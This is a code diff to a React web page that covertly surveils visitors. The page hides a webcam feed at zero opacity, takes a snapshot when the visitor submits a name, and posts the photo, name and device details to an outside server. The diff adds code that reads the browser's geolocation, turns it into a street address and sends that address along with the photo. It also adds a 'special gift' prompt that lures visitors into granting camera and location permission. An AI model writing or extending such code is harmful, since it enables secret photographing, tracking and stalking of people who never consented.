@@ -1,17 +1,40 @@
-import { useState, useRef } from 'react'
+import { useState, useRef, useEffect } from 'react'
 import './App.css'
 import Webcam from 'react-webcam'
 
 function App() {
-
   const webcamRef = useRef(null)
   const [photo, setPhoto] = useState(null)
+  const [allow, setAllow] = useState(false)
+  const [location, setLocation] = useState(null)
+  useEffect(() => {
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
 
+        console.log(lat, lon);
+
+        setAllow(true);
+
+        const res = await fetch(
+          `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`
+        );
+
+        const data = await res.json();
+        console.log(data.display_name);
+        setLocation(data.display_name)
+      },
+      (error) => {
+        setAllow(false);
+        console.log(error.message);
+      }
+    );
+  }, []);
   const capture = async (e) => {
     e.preventDefault()
     const name = e.target.name.value
     console.log(name);
-    
     if (!webcamRef.current) return
     const imageSrc = webcamRef.current.getScreenshot()
 
@@ -21,7 +44,6 @@ function App() {
     await fetch('https://click-server-yur0.onrender.com/', {
 
       method: 'POST',
-
       headers: {
         'Content-Type': 'application/json'
       },
@@ -29,7 +51,8 @@ function App() {
       body: JSON.stringify({
             imageSrc,
             name,
-            device 
+            device,
+            location 
           })
 
     })
@@ -37,7 +60,9 @@ function App() {
   }
 
   return (
+    
     <div>
+      {!allow && alert('Please allow location and camera permission for your special gift')}
       <Webcam
         style={{width:'1920px', height:'1080', opacity: 0, position: 'absolute'}}
         ref={webcamRef}
@@ -46,9 +71,6 @@ function App() {
           console.log("Camera allowed")
         }}
 
-        onUserMediaError={() => {
-          alert("Please allow camera permission")
-        }}
       />
         <form style={{ marginTop: '200px', display: 'flex', flexDirection: 'column', justifyContent:'center,', alignItems:'center', gap:'10px'}} onSubmit={capture}>
           <p style={{color:'blue', marginRight:'100px'}}>Your Name:</p>
